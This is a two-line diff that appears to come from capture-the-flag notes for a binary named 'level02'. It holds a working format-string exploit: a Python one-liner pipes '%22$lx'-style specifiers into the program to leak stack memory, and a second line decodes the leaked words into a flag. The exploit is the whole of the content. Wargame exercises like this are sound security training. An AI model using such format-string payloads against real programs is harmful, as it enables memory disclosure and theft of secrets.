@@ -1,0 +1,2 @@
+python -c 'print("%22$lx,%23$lx,%24$lx,%25$lx,%26$lx")' | ./level02
+b"".join(map(lambda x: int(x, 16).to_bytes(8, 'little'), flag.split(',')))
